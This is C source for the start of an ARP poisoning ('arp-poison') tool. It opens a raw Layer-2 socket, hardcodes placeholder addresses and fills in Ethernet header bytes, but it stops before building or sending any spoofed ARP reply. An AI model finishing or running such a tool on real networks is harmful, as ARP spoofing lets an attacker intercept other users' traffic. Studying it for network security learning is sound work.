#include "arp_attack.h"

void usage()
{
  puts("usage:\t./arp-poison <interface> <gateway ip> <mac addr>");
  puts("ex:\t./arp-poison eth0 10.1.1.1 aa:bb:cc:dd:ee:ff");
  exit(1);
}

void cleanup(int sock)
{
	close(sock);
	exit(0);
}

arp_addrs_t init_addrs()
{
  return (arp_addrs_t) {
    .source_mac={0x08, 0x00, 0x27, 0xaa, 0xbb, 0xcc},
    .source_ip={192, 168, 1, 1},
    .target_mac={0xde, 0xad, 0xbe, 0xef, 0x11, 0x22},
    .target_ip={192, 168, 1, 1}
  };

}

int open_socket()
{
  //Creates a raw Layer-2 socket for sending/receiving ARP frames and returns a file descriptor.
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("socket");
        exit(1);
    }
    return sock;
}

void set_ether_headers(arp_addrs_t arp_addrs, uint8_t *reply_arp)
{
  memcpy(reply_arp, arp_addrs.target_mac, 6);  
  memcpy(reply_arp + 6, arp_addrs.source_mac, 6);   
  reply_arp[12] = 0x08;                     
  reply_arp[13] = 0x06; // EtherType = ARP (0x0806)

}
void control_attack()
{
  int sock;
  uint8_t reply_arp[42];

  arp_addrs_t arp_addrs = init_addrs();

  sock = open_socket();

  set_ether_headers(arp_addrs, reply_arp);

}

